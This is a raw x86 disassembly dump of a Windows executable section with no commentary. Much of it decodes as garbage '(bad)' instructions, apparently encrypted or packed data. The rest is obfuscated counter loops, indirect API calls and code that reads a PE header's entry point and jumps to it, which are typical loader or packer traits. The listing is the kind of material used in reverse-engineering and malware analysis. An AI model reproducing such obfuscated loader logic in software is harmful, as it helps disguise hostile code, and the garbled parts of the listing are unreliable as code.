  41115f:	sub    bl,BYTE PTR [esi]
  411161:	and    esi,DWORD PTR [eax+edi*8+0x4db3f572]
  411168:	inc    ebp
  411169:	scas   eax,DWORD PTR es:[edi]
  41116a:	push   ecx
  41116b:	cld    
  41116c:	int    0x82
  41116e:	clc    
  41116f:	push   esi
  411170:	enter  0xf285,0x2c
  411174:	ret    
  411175:	fidivr DWORD PTR [ecx+0x314608d5]
  41117b:	loop   0x411139
  41117d:	in     eax,dx
  41117e:	push   esp
  41117f:	pop    eax
  411180:	dec    eax
  411181:	add    DWORD PTR [eax+0x70],ebx
  411184:	(bad)  
  411185:	enter  0xc832,0x32
  411189:	mov    eax,ds:0xbf3056c9
  41118e:	xor    DWORD PTR [ebx+edi*8+0x74d16027],ecx
  411195:	icebp  
  411196:	push   edx
  411197:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411199:	inc    ecx
  41119a:	mov    ecx,DWORD PTR [edx]
  41119c:	clc    
  41119d:	sbb    al,0xd1
  41119f:	xchg   esi,eax
  4111a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111a1:	dec    eax
  4111a2:	mov    ?,ebx
  4111a4:	xchg   BYTE PTR ds:0xf47dc32d,dh
  4111aa:	ret    
  4111ab:	sti    
  4111ac:	cmp    bl,ch
  4111ae:	repnz inc ebp
  4111b0:	cdq    
  4111b1:	or     edx,DWORD PTR [edi+ebx*2+0x66]
  4111b5:	jbe    0x4111ff
  4111b7:	dec    ecx
  4111b8:	in     eax,dx
  4111b9:	or     BYTE PTR [ebp-0x38787437],bl
  4111bf:	jle    0x4111d2
  4111c1:	std    
  4111c2:	mov    ah,0xcc
  4111c4:	sub    BYTE PTR [ebx],ch
  4111c6:	xlat   BYTE PTR ds:[ebx]
  4111c7:	inc    BYTE PTR [ecx-0x42ab460f]
  4111cd:	sub    al,bh
  4111cf:	sbb    BYTE PTR ds:[eax],ah
  4111d2:	outs   dx,BYTE PTR ds:[esi]
  4111d3:	push   ebp
  4111d4:	xchg   ecx,eax
  4111d5:	inc    edi
  4111d6:	je     0x411200
  4111d8:	ret    0xaf93
  4111db:	ret    
  4111dc:	or     ah,al
  4111de:	imul   ebx,DWORD PTR [esi],0xffffffe0
  4111e1:	pop    esi
  4111e2:	mov    bl,0xea
  4111e4:	pop    eax
  4111e5:	sbb    BYTE PTR [eax],dh
  4111e7:	mov    ebx,0xd70e7152
  4111ec:	mov    ds:0xbf0b28dc,al
  4111f1:	xor    al,0x99
  4111f3:	sub    al,0xab
  4111f5:	and    ebx,DWORD PTR [ecx+0x2d]
  4111f8:	inc    ebx
  4111f9:	cdq    
  4111fa:	test   eax,0x16290991
  4111ff:	sbb    DWORD PTR [ebx-0x3e],0x3656ebd2
  411206:	inc    edi
  411207:	cmc    
  411208:	into   
  411209:	adc    esi,edx
  41120b:	mov    ebx,0x153c1a6c
  411210:	(bad)  
  411211:	pop    edx
  411212:	(bad)  [edx]
  411214:	push   ds
  411215:	(bad)  
  411217:	in     eax,0xe6
  411219:	call   0x1333:0x93e3fdda
  411220:	scas   al,BYTE PTR es:[edi]
  411221:	arpl   dx,dx
  411223:	pop    esi
  411224:	ror    BYTE PTR [esp+ecx*8+0x3e887de4],cl
  41122b:	jns    0x4111dd
  41122d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41122e:	lahf   
  41122f:	retf   0x9b19
  411232:	scas   eax,DWORD PTR es:[edi]
  411233:	pop    esp
  411234:	jmp    0x56c0:0x3e7aa6f5
  41123b:	out    dx,al
  41123c:	jno    0x411211
  41123e:	or     BYTE PTR [esi-0x27],dl
  411241:	fadd   DWORD PTR [edi]
  411243:	sbb    ecx,DWORD PTR [ebx+0x3c]
  411246:	aam    0x3d
  411248:	out    dx,eax
  411249:	xchg   edx,eax
  41124a:	xor    DWORD PTR [edi+0x78],esp
  41124d:	cmp    DWORD PTR [eax*1-0x2ee0cc2e],eax
  411254:	add    edi,DWORD PTR [edx-0x1d987123]
  41125a:	lock shl DWORD PTR [ecx-0x63],cl
  41125e:	mov    WORD PTR [edx-0x786fa4be],fs
  411264:	cwde   
  411265:	xchg   ebx,eax
  411266:	or     al,0x88
  411268:	push   0xc0a9173
  41126d:	add    BYTE PTR ds:0xabfc6c75,al
  411273:	outs   dx,DWORD PTR ds:[esi]
  411274:	in     al,dx
  411275:	add    bh,BYTE PTR [ebx+esi*2]
  411278:	xchg   esi,eax
  411279:	push   ebp
  41127a:	mov    DWORD PTR [eax+0x3d],0x48ef1a29
  411281:	mov    dh,0x54
  411283:	cmp    ah,BYTE PTR [ebp-0x67b5ca59]
  411289:	jmp    0xcdfaef56
  41128e:	push   ss
  41128f:	dec    ecx
  411290:	push   ebx
  411291:	or     esp,ecx
  411293:	outs   dx,DWORD PTR ds:[esi]
  411294:	push   eax
  411295:	dec    ebp
  411296:	or     esi,DWORD PTR [edx+0xc71519d]
  41129c:	dec    ebp
  41129d:	out    0x7f,eax
  41129f:	xchg   ebp,eax
  4112a0:	mov    cl,0x6b
  4112a2:	cmp    ebp,ecx
  4112a4:	xor    bh,BYTE PTR [ebx+edi*4]
  4112a7:	add    edi,DWORD PTR [ecx+0x6a35b611]
  4112ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112ae:	dec    edi
  4112af:	ret    
  4112b0:	fisubr DWORD PTR [ebx-0x29f8106f]
  4112b6:	call   0xd7a8:0xb4f6f82c
  4112bd:	mov    esi,0xf4513d7c
  4112c2:	xchg   edi,eax
  4112c3:	fwait
  4112c4:	sub    ebx,DWORD PTR [edi+0x5772d768]
  4112ca:	dec    edi
  4112cb:	jns    0x4112cc
  4112cd:	imul   edi,DWORD PTR [edx],0x17
  4112d0:	push   cs
  4112d1:	xor    al,0x61
  4112d3:	nop
  4112d4:	mov    ch,0xf3
  4112d6:	ins    DWORD PTR es:[edi],dx
  4112d7:	or     DWORD PTR [esi+0x6188a83e],esi
  4112dd:	cmp    bl,cl
  4112df:	js     0x4112b8
  4112e1:	ds adc eax,0x63d4eada
  4112e7:	aas    
  4112e8:	pusha  
  4112e9:	xor    esi,eax
  4112eb:	mov    eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434583
  411346:	xor    DWORD PTR ds:0x43454f,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x43447f,0x14
  41135d:	cmp    DWORD PTR ds:0x43447f,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x43447f,0x3
  411371:	jne    0x411387
  411377:	push   0x4346fa
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x43447f,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x43447f
  411399:	dec    eax
  41139a:	mov    ds:0x43447f,eax
  41139f:	mov    eax,ds:0x43447f
  4113a4:	dec    eax
  4113a5:	mov    ds:0x43447f,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x43446f,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x4344c3,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x4344c3
  4113d0:	inc    eax
  4113d1:	mov    ds:0x4344c3,eax
  4113d6:	cmp    DWORD PTR ds:0x4344c3,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x4344c3,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x4344ff
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x4344c3,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x4344c3
  411418:	inc    eax
  411419:	mov    ds:0x4344c3,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43458f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43458f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43458f,ebx
  411442:	cmp    DWORD PTR ds:0x43458f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434513
  411457:	push   0x43465b
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43458f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43458f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43458f,ebx
  41147c:	cmp    DWORD PTR ds:0x43458f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x43445f
  411490:	adc    DWORD PTR ds:0x434547,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434503,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434583,0x434467
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x434553,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x434577,0x434473
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x43454b,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x43447f,0x4344bf
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434593,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x43447f,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x43447f
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x43447f,edi
  411509:	cmp    DWORD PTR ds:0x43447f,0xb
  411510:	jne    0x411529
  411516:	push   0x434587
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x43447f,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x43447f
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x43447f,edi
  411545:	cmp    DWORD PTR ds:0x43447f,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x434467,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x434477,0x1a
  411569:	cmp    DWORD PTR ds:0x434477,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x434477,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x434477,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x434477
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x434477,edi
  4115ac:	mov    edi,DWORD PTR ds:0x434477
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x434477,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x43446b
  4115c4:	adc    DWORD PTR ds:0x434463,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43458b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43458b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43458b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43458b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43458b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43458b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43458b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43458b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x41164a
  411641:	pop    esp
  411642:	push   es
  411643:	aaa    
  411644:	(bad)  
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x4116c3
  41164d:	mov    ah,0x94
  41164f:	or     BYTE PTR [eax+0x48adaa73],ah
  411655:	cmc    
  411656:	xchg   edi,eax
  411657:	cmp    al,0xe7
  411659:	mov    edi,0xd57374d
  41165e:	xchg   DWORD PTR [ebp-0x39],edi
  411661:	and    ebp,DWORD PTR [eax]
  411663:	fbld   TBYTE PTR [edx+0x31f4937b]
  411669:	rcl    BYTE PTR [ebx],cl
  41166b:	aas    
  41166c:	mov    WORD PTR [ecx-0x30],cs
  41166f:	pushf  
  411670:	mov    eax,DWORD PTR [esi-0x1a449604]
  411676:	sub    esp,esi
  411678:	enter  0x8c01,0xb6
  41167c:	popf   
  41167d:	ja     0x411609
  41167f:	cmp    al,0x1c
  411681:	mov    ebp,0x8bcc5769
  411686:	sti    
  411687:	add    DWORD PTR [ebp-0xb],esi
  41168a:	jle    0x41167d
  41168c:	xchg   ebx,eax
  41168d:	sahf   
  41168e:	es and eax,0x6c6143e0
  411694:	mov    BYTE PTR [edi],al
  411696:	push   es
  411697:	fwait
  411698:	popf   
  411699:	pop    esp
  41169a:	xor    DWORD PTR [ebx+edx*1+0x26],edx
  41169e:	fadd   QWORD PTR [edi-0x45]
  4116a1:	mov    ch,0x50
  4116a3:	mov    BYTE PTR [esi],bh
  4116a5:	aaa    
  4116a6:	inc    ebx
  4116a7:	xchg   DWORD PTR [eax],ebp
  4116a9:	mov    esi,0xd9fa7b16
  4116ae:	ds mov ebp,0x87d4b51f
  4116b4:	dec    ebp
  4116b5:	jae    0x411702
  4116b7:	inc    edx
  4116b8:	push   ecx
  4116b9:	xor    DWORD PTR [esi+0x61],esp
  4116bc:	idiv   ecx
  4116be:	sbb    DWORD PTR [ebp-0x40],ebx
  4116c1:	fbstp  TBYTE PTR ds:0x8a474965
  4116c7:	xlat   BYTE PTR ds:[ebx]
  4116c8:	hlt    
  4116c9:	xchg   edi,eax
  4116ca:	xor    al,0x82
  4116cc:	jle    0x41165a
  4116ce:	jne    0x4116fc
  4116d0:	mov    ah,0x99
  4116d2:	dec    esp
  4116d3:	mov    edi,ecx
  4116d5:	cmp    eax,0xf9391a96
  4116da:	inc    ebx
  4116db:	into   
  4116dc:	fdivr  QWORD PTR [ecx+0x797e8248]
  4116e2:	xor    BYTE PTR [esi-0x71c49488],dl
  4116e8:	cmp    al,BYTE PTR [ecx]
  4116ea:	out    0x52,al
  4116ec:	lods   eax,DWORD PTR ds:[esi]
  4116ed:	inc    edi
  4116ee:	mov    edx,0x3af3c916
  4116f3:	and    edi,esi
  4116f5:	pop    eax
  4116f6:	rcl    BYTE PTR [edi],1
  4116f8:	ret    0x5eed
  4116fb:	push   es
  4116fc:	jo     0x41170f
  4116fe:	add    eax,0x4551b55a
  411703:	es retf 0xcfaf
  411707:	dec    ebp
  411708:	ss leave 
  41170a:	push   ds
  41170b:	jl     0x411744
  41170d:	xchg   edi,eax
  41170e:	xor    edx,DWORD PTR [eax+0x3]
  411711:	clc    
  411712:	je     0x411776
  411714:	sbb    bl,ah
  411716:	daa    
  411717:	ror    DWORD PTR [ebx],cl
  411719:	add    al,0x74
  41171b:	sub    bh,dl
  41171d:	data16 into 
  41171f:	adc    BYTE PTR [eax+edx*4],0x4b
  411723:	test   DWORD PTR [ecx],esp
  411725:	mov    ?,WORD PTR fs:[edi+0x12]
  411729:	inc    ebx
  41172a:	(bad)  
  41172c:	(bad)  
  41172d:	sbb    al,0xa3
  41172f:	cwde   
  411730:	(bad)  
  411731:	dec    esp
  411732:	adc    BYTE PTR [esi+0x7b],cl
  411735:	push   es
  411736:	jmp    0xaeb3:0xe5becb6f
  41173d:	mov    eax,ds:0x7f1baac2
  411742:	es dec ebx
  411744:	rol    esi,0x29
  411747:	sub    BYTE PTR ds:0x8c43c42b,0x8b
  41174e:	jmp    0xf4efd8b3
  411753:	jge    0x411700
  411755:	das    
  411756:	cmc    
  411757:	xchg   ebx,eax
  411758:	loopne 0x4117b0
  41175a:	adc    ah,BYTE PTR [ecx-0x4a6642b6]
  411760:	adc    al,0x76
  411762:	mov    bl,0x42
  411764:	jnp    0x41179e
  411766:	retf   
  411767:	arpl   WORD PTR [ebx-0x20],cx
  41176a:	push   0x22013cf3
  41176f:	sti    
  411770:	dec    eax
  411771:	popf   
  411772:	pop    ecx
  411773:	inc    eax
  411774:	ret    0x6aea
  411777:	in     al,0x7d
  411779:	icebp  
  41177a:	xchg   DWORD PTR [edi+edi*1+0x6b],edi
  41177e:	stos   DWORD PTR es:[edi],eax
  41177f:	dec    ebx
  411780:	adc    eax,0x30058c27
  411785:	lods   al,BYTE PTR ds:[esi]
  411786:	clc    
  411787:	xor    edx,0x71
  41178a:	xor    ch,bh
  41178c:	outs   dx,DWORD PTR ds:[esi]
  41178d:	jae    0x411749
  41178f:	mov    BYTE PTR [eax],ch
  411791:	dec    DWORD PTR [ecx+edi*1-0x58ca58e3]
  411798:	(bad)  
  411799:	call   0xf1d4bedc
  41179e:	ret    0x5340
  4117a1:	iret   
  4117a2:	xchg   BYTE PTR [edi],bh
  4117a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a5:	pop    edx
  4117a6:	sbb    esi,DWORD PTR [ebx]
  4117a8:	aaa    
  4117a9:	psubw  mm4,QWORD PTR [eax]
  4117ac:	rcr    BYTE PTR [esi+0x6b],cl
  4117af:	out    dx,al
  4117b0:	jae    0x4117f2
  4117b2:	mov    esi,eax
  4117b4:	cmp    eax,0x488f6496
  4117b9:	ret    
  4117ba:	inc    esp
  4117bb:	fisttp QWORD PTR [edx]
  4117bd:	sub    bh,BYTE PTR [eax+0x2b]
  4117c0:	pop    ebp
  4117c1:	mov    BYTE PTR [eax],al
  4117c3:	out    0xc7,eax
  4117c5:	jbe    0x411751
  4117c7:	ds pop edx
  4117c9:	fdiv   DWORD PTR [ebp+0x14b6d7e9]
  4117cf:	cmp    DWORD PTR ds:0x8811eff9,edi
  4117d5:	imul   esp,DWORD PTR [ecx+0x1b],0xffffffa9
  4117d9:	int3   
  4117da:	xchg   DWORD PTR [ebx*2-0x351b7f64],edx
  4117e1:	das    
  4117e2:	inc    ecx
  4117e3:	retf   0xfd0a
  4117e6:	push   edi
  4117e7:	push   es
  4117e8:	push   esi
  4117e9:	xor    BYTE PTR [edi-0x454dacb2],ah
  4117ef:	out    0x42,eax
  4117f1:	xor    eax,0x4e22bcdc
  4117f6:	lods   eax,DWORD PTR ds:[esi]
  4117f7:	jmp    0x22eb:0x97429cc8
  4117fe:	xchg   esi,eax
  4117ff:	cli    
  411800:	jle    0x411820
  411802:	or     DWORD PTR ds:0x82ed10c1,ecx
  411808:	inc    eax
  411809:	adc    DWORD PTR [ebx-0x623d286c],ecx
  41180f:	ins    BYTE PTR es:[edi],dx
  411810:	les    edx,FWORD PTR [ebx+0x2a226ccb]
  411816:	cmp    bl,BYTE PTR [ebx*2+0x38de2ac0]
  41181d:	xchg   esp,eax
  41181e:	sti    
  41181f:	fadd   QWORD PTR [ebp-0x2cb1abb8]
  411825:	fnsave [eax+0x234d692c]
  41182b:	repnz retfw 
  41182e:	fstp   TBYTE PTR [esi+0x7879]
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	data16 xor bh,dl
  411853:	jb     0x41183f
  411855:	push   esp
  411856:	jle    0x4118d6
  411858:	pop    ecx
  411859:	jg     0x4118d9
  41185b:	jle    0x4118da
  41185d:	jno    0x411805
  41185f:	or     cl,BYTE PTR [edx]
  411861:	out    dx,eax
  411862:	scas   eax,DWORD PTR es:[edi]
  411863:	pop    ds
  411864:	retf   0xb857
  411867:	xchg   bh,dl
  411869:	vunpcklps xmm0,xmm6,XMMWORD PTR [esi+edi*4-0x36]
  41186f:	push   edi
  411870:	sbb    dh,BYTE PTR [ecx+0x7d]
  411873:	pop    ss
  411874:	inc    BYTE PTR [eax+0x54]
  411877:	jae    0x4118e4
  411879:	outs   dx,BYTE PTR ds:[esi]
  41187a:	loopne 0x411843
  41187c:	jmp    0x61067649
  411881:	add    esi,ebx
  411883:	dec    edi
  411884:	iret   
  411885:	loope  0x4118ea
  411887:	xlat   BYTE PTR ds:[ebx]
  411888:	int3   
  411889:	dec    eax
  41188a:	dec    eax
  41188b:	xchg   esi,eax
  41188c:	arpl   WORD PTR [ebp-0x1f],si
  41188f:	jl     0x41183b
  411891:	hlt    
  411892:	add    al,0x4
  411894:	or     BYTE PTR [edi+0x75],bl
  411897:	cmp    eax,0x190706af
  41189c:	mov    bh,0x9f
  41189e:	mov    ds:0x18622504,eax
  4118a3:	stos   BYTE PTR es:[edi],al
  4118a4:	(bad)  
  4118a5:	lods   eax,DWORD PTR ds:[esi]
  4118a6:	shl    edx,1
  4118a8:	pop    es
  4118a9:	icebp  
  4118aa:	adc    ch,BYTE PTR [eax-0x7b]
  4118ad:	sahf   
  4118ae:	pop    eax
  4118af:	adc    edi,esp
  4118b1:	neg    BYTE PTR [ebp-0x55]
  4118b4:	or     bh,al
  4118b6:	(bad)  
  4118b8:	mov    eax,0xfeb3314b
  4118bd:	idiv   BYTE PTR [edi]
  4118bf:	cmp    bh,BYTE PTR [esi+0x42]
  4118c2:	in     eax,dx
  4118c3:	icebp  
  4118c4:	jae    0x4118c8
  4118c6:	xchg   ecx,eax
  4118c7:	add    esp,DWORD PTR [eax-0x2e9036f6]
  4118cd:	dec    edx
  4118ce:	mov    al,0x6e
  4118d0:	stos   DWORD PTR es:[edi],eax
  4118d1:	leave  
  4118d2:	and    eax,0x1eaa9024
  4118d7:	lahf   
  4118d8:	xchg   DWORD PTR [esi+0x61581909],ebx
  4118de:	mov    esi,0xf892ae8c
  4118e3:	xlat   BYTE PTR ds:[ebx]
  4118e4:	mov    edi,0x8ee14559
  4118e9:	xchg   BYTE PTR [esi-0x19],al
  4118ec:	adc    esi,edi
  4118ee:	mov    al,BYTE PTR [edx+0x75]
  4118f1:	(bad)  [eax+0x3ea22e94]
  4118f7:	xchg   esp,eax
  4118f8:	daa    
  4118f9:	int3   
  4118fa:	pop    esi
  4118fb:	dec    edx
  4118fc:	jne    0x411896
  4118fe:	or     BYTE PTR [edi-0x24],bh
  411901:	test   DWORD PTR [eax-0x16],ebx
  411904:	(bad)  
  411906:	(bad)  
  411907:	sub    al,0x53
  411909:	xor    ecx,DWORD PTR [ebx+0x4d925479]
  41190f:	sub    BYTE PTR [edi+edi*2+0x16],dl
  411913:	fbld   TBYTE PTR [eax+0x649c5f6b]
  411919:	dec    eax
  41191a:	not    BYTE PTR [ebp+edi*1+0x4183200b]
  411921:	lods   eax,DWORD PTR ds:[esi]
  411922:	mov    al,ds:0x521a4374
  411927:	pop    ds
  411928:	or     eax,0x5543bf47
  41192d:	(bad)  
  41192e:	jge    0x411901
  411930:	fdivr  DWORD PTR [ebp-0x3b]
  411933:	test   BYTE PTR [ebp-0x13a1f97],bh
  411939:	add    al,0x24
  41193b:	ret    0x7d80
  41193e:	mov    ds:0x5c725fa1,al
  411943:	mov    es,WORD PTR [edx-0x3f]
  411946:	and    edx,eax
  411948:	or     bl,ah
  41194a:	out    0xc1,al
  41194c:	mov    eax,ds:0xb29fdad8
  411951:	(bad)  
  411952:	pop    esp
  411953:	(bad)  
  411954:	aas    
  411955:	ficom  WORD PTR [edx-0x65ad677e]
  41195b:	dec    ebx
  41195c:	push   ebx
  41195d:	pop    ebx
  41195e:	pop    esi
  41195f:	push   edx
  411960:	push   edx
  411961:	mov    fs,WORD PTR [ebx-0x2685604a]
  411967:	(bad)  
  411968:	sahf   
  411969:	xchg   ebx,eax
  41196a:	mov    cl,0x68
  41196c:	pmaxsw mm0,QWORD PTR [ecx]
  41196f:	es adc al,0xfb
  411972:	icebp  
  411973:	(bad)
  411977:	add    BYTE PTR ds:0x7368e90f,al
  41197d:	pop    ebp
  41197e:	push   ss
  41197f:	test   eax,0x15cdfe03
  411984:	stos   BYTE PTR es:[edi],al
  411985:	lea    edx,[esi]
  411987:	stc    
  411988:	xchg   edi,eax
  411989:	(bad)  
  41198a:	pop    esp
  41198b:	mov    ebx,0x8f415771
  411990:	ins    BYTE PTR es:[edi],dx
  411991:	inc    eax
  411992:	sbb    DWORD PTR [edx],0x69
  411995:	rcl    BYTE PTR [edi],0xd0
  411998:	(bad)  
  411999:	adc    al,0x21
  41199b:	mov    ebx,0x1fce394f
  4119a0:	pusha  
  4119a1:	ss dec esp
  4119a3:	adc    BYTE PTR [edx+0xb9adcd6],ch
  4119a9:	or     DWORD PTR [esp+edx*1],ebx
  4119ac:	cdq    
  4119ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ae:	ret    0x952
  4119b1:	sbb    eax,0x1c802fd0
  4119b6:	jl     0x4119cb
  4119b8:	mov    al,0x75
  4119ba:	cmc    
  4119bb:	mov    edx,0x12de71cb
  4119c0:	mov    al,ds:0xb4491ebc
  4119c5:	ins    BYTE PTR es:[edi],dx
  4119c6:	shr    DWORD PTR [edx-0x2f],cl
  4119c9:	jecxz  0x41194c
  4119cb:	daa    
  4119cc:	hlt    
  4119cd:	jbe    0x4119e5
  4119cf:	sub    al,0x62
  4119d1:	and    esp,DWORD PTR [ecx]
  4119d3:	mov    ch,0xf7
  4119d6:	pop    edx
  4119d7:	daa    
  4119d8:	dec    ebp
  4119d9:	aad    0x6b
  4119db:	scas   eax,DWORD PTR es:[edi]
  4119dc:	ins    BYTE PTR es:[edi],dx
  4119dd:	js     0x411973
  4119df:	dec    ecx
  4119e0:	in     eax,dx
  4119e1:	call   0xe60d077d
  4119e6:	clc    
  4119e7:	aad    0x66
  4119e9:	push   esp
  4119ea:	push   ebx
  4119eb:	adc    al,0xce
  4119ed:	mov    ds:0x1f03affc,al
  4119f2:	cs aaa 
  4119f4:	mov    dl,0xef
  4119f6:	pop    ds
  4119f7:	data16 hlt 
  4119f9:	je     0x411a4c
  4119fb:	and    DWORD PTR [edx],edi
  4119fd:	loop   0x411995
  4119ff:	sbb    BYTE PTR [ebp+0x4c],cl
  411a02:	in     al,0x79
  411a04:	call   0xc56b:0xe6c51187
  411a0b:	outs   dx,BYTE PTR ds:[esi]
  411a0c:	cld    
  411a0d:	loop   0x411a36
  411a0f:	(bad)  
  411a10:	cmp    DWORD PTR [ecx+ebx*2+0x431b0c4d],esp
  411a17:	fimul  DWORD PTR [ebx]
  411a19:	stc    
  411a1a:	jne    0x4119a3
  411a1c:	mov    edi,0x97b1ace
  411a21:	out    dx,al
  411a22:	lds    esp,FWORD PTR [edx+0x2e]
  411a25:	fiadd  WORD PTR [ebx-0x44]
  411a28:	aad    0xba
  411a2a:	xor    eax,0x2310bd5b
  411a2f:	jp     0x411a82
  411a31:	pop    ebx
  411a32:	inc    edi
  411a33:	push   cs
  411a34:	xchg   esi,eax
  411a35:	xor    al,0x1d
  411a37:	sub    bh,dl
  411a39:	inc    eax
  411a3a:	test   al,0x11
  411a3c:	arpl   WORD PTR [ebp-0x4e],sp
  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x4344f7
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x434477,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x43454f
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x43454f,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
